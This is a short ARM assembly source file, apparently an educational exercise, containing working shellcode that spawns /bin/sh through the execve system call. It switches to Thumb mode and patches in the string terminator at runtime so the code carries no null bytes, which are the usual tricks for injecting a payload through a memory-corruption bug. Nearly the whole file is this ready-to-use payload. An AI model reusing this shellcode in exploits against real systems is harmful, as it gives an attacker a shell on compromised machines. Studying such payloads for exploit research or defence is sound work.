.section .text
.global  _start

_start:
	.code	32
	add	r3, pc, #1	@ set odd bit for jumping to thumb mode
	bx	r3		@ a jump to pc will take us to our first thumb add cuz pc 
				@ at the time it was loaded into r3 pointed there (pc points 2 instructions ahead)

	.code	16
	add	r0, pc,	#8	@ addr of string, pc is 2 inst ahead, thumb inst are 2 bytes
	eor	r1, r1, r1	@ argv
	eor	r2, r2, r2	@ envp
	strb	r1, [r0,#7]
	mov	r7, #11		@ __NR_execve
	svc	#1

.ascii "/bin/shx"
